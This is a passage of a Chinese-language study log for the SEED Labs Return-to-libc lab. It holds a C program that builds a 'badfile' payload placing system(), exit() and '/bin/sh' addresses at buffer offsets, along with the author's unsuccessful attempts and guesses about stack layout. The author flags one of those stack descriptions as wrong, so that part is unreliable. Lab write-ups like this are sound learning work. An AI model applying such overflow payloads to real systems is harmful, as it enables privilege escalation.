<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>
    badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">&quot;./badfile&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;w&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* You need to decide the addresses and
    the values for X, Y, Z. The order of the following three statements does not imply the order of X, Y, Z. Actually, we intentionally scrambled the order. */</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xbffffdef</span> <span class="token punctuation">;</span> <span class="token comment">// &quot;/bin/sh&quot; </span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xb7da4da0</span> <span class="token punctuation">;</span> <span class="token comment">// system()  </span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xb7d989d0</span> <span class="token punctuation">;</span> <span class="token comment">// exit() </span>
    <span class="token comment">// printf(&quot;%d\n&quot;, sizeof(long));</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>但是运行出来的结果:
<img src="/note/img/2020-02-07-11-14-22.png" alt=""></p> <p>仍然是 <code>$</code> 并没有预期的 <code>#</code>, 输出的第一行是 <code>MYSHELL</code> 的地址.</p> <p>关于 <code>exit</code> 方法, 如果尝试删掉它, 会导致失败, 提示溢出.</p> <p>我先做到这吧, 问题太硬了.</p> <h3 id="我又回来了"><a href="#我又回来了" class="header-anchor">#</a> 我又回来了</h3> <p>在 <em>Buffer-Overflow Vulnerability Lab</em> 实验指导的 Guidelines 有这么一幅图:</p> <p><img src="/note/img/2020-02-07-13-27-44.png" alt=""></p> <p>从右侧的 b 可以看到, <code>func</code> 方法在栈中由高位到低位分别是方法参数, 返回地址, 然后才是方法内部的东西.</p> <p>那么结合 T3 的要求, 可以做出一个<strong>假设</strong>: 缓冲溢出的内容会被写入到栈内. 那么由高位到低位, 我们先写入 <code>system</code> 方法的参数 <code>MYSHELL</code> 的地址, 然后写下返回地址, 即 <code>exit</code> 方法地址, 最后写入 <code>system</code> 方法地址. 32 位系统寄存器 4B 一个, 所以 X Y Z 的间隔为 4.</p> <p>retlib 从 badfile 中一共读取了 300 长度的内容 (可能实际没有这么多), 这些东西分成三个部分: 写入 buffer 数组的, 记录地址信息的, 还有一些空余空间.</p> <p>那么另外一个<strong>假设</strong>是, 程序应该专门划出了一个大小为 12 的栈空间来保存 buffer 数组, 剩下的数据 (包括多余数据和地址信息) 应该写在紧贴着 buffer 数组的下方 (低位), 同时, ESP 也被修改为剩余数据开头元素在栈中的地址. <strong>特别地, 剩余数据的入栈顺序是数组逆序</strong>. 如此, 程序才有可能将相关的地址信息推出栈, 这也能解释为什么是 32 24 28, 而不是 28 24 32.</p> <p><img src="/note/img/2020-02-07-14-23-48.png" alt=""></p> <p>2-9 和 2-10 两天我在处理 D1 的实验三, 希望能得到一些东西, 我发现上面的假设二有些问题, 栈结构的模型不是这样的.</p> <div class="custom-block danger"><p class="custom-block-title">需要修改</p> <p>这里对栈结构的描述有问题.</p></div> <p>虽然能够大致解释, 但是我仍然看不到 <code>#</code> 的 shell, 后面的 T4 T5 T6 也没办法直接解决, 有一种便秘的感觉.</p> <div class="custom-block tip"><p class="custom-block-title">关于 root shell 没有成功获取</p> <p>或许可以考虑一下 VM Ware, 虽然我也不知道原理.</p></div> <h2 id="t4-turning-on-address-randomization"><a href="#t4-turning-on-address-randomization" class="header-anchor">#</a> T4 Turning on address randomization</h2> <p>启动内存地址随机化机制, 重新攻击.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">2</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="t5-defeat-shell’s-countermeasure"><a href="#t5-defeat-shell’s-countermeasure" class="header-anchor">#</a> T5 Defeat Shell’s countermeasure</h2> <h2 id="t6-defeat-shell’s-countermeasure-without-putting-zeros-in-input"><a href="#t6-defeat-shell’s-countermeasure-without-putting-zeros-in-input" class="header-anchor">#</a> T6 Defeat Shell’s countermeasure without putting zeros in input</h2></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">7/30/2020, 11:43:12 PM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/log/seed_labs/Android Repackaging Attack Lab.html" class="prev">Android Repackaging Attack Lab</a></span> <span class="next"><a href="/log/seed_labs/Virtual Private Network Lab.html">Virtual Private Network Lab</a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.27d58fa7.js" defer></script><script src="/assets/js/2.f1f09924.js" defer></script><script src="/assets/js/43.91bf82a7.js" defer></script>
  </body>
</html>
